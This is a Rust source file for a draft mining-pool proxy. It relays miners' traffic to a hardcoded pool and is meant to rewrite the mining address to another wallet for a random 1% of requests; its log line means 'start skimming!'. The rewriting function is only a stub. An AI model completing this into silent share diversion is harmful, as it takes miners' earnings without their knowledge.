use std::error::Error;
use tokio::net::{TcpListener, TcpStream};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use std::sync::Arc;
mod test2;
mod test3;


async fn handle_client(mut inbound: TcpStream, pool_address: &str, target_address: &str, fee_percentage: f64) -> Result<(), Box<dyn std::error::Error>> {
    let mut outbound = TcpStream::connect(pool_address).await?;
    let mut buffer = vec![0; 1024];

    // Read from the client
    let n = inbound.read(&mut buffer).await?;
    if n == 0 {
        return Ok(());
    }

    // Here you would parse the request and potentially modify it
    // For example, if this is a mining subscribe request or a share submission,
    // you might want to modify the mining address.
    if should_divert(fee_percentage) {
        modify_request(&mut buffer, target_address);
    }

    // Write to the pool
    outbound.write_all(&buffer[0..n]).await?;

    // Relay response back to client
    let n = outbound.read(&mut buffer).await?;
    inbound.write_all(&buffer[0..n]).await?;

    Ok(())
}

// Function to decide if we should divert this request
fn should_divert(fee_percentage: f64) -> bool {
    // Simple logic for diversion based on fee percentage
    rand::random::<f64>() < fee_percentage
}

// Function to modify the mining address in the request
fn modify_request(buffer: &mut Vec<u8>, target_address: &str) {
    // Parse the buffer and replace the original mining address with target_address
    // This is highly protocol-dependent and requires detailed parsing.
    println!("开始抽水！")
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    test3::f2_proxy_v2();
    Ok(())
}

async fn temp() -> Result<(), Box<dyn Error>> {
    let listener = TcpListener::bind("0.0.0.0:8080").await?;
    let pool_address = Arc::new("8.217.125.233:8896".to_string());
    let target_address = Arc::new("your.wallet.address".to_string());
    let fee_percentage = 0.01; // 1% fee

    loop {
        let (inbound, _) = listener.accept().await?;
        let pool_address = Arc::clone(&pool_address);
        let target_address = Arc::clone(&target_address);

        tokio::spawn(async move {
            if let Err(e) = handle_client(inbound, &pool_address, &target_address, fee_percentage).await {
                eprintln!("Error handling client: {:?}", e);
            }
        });
    }
}
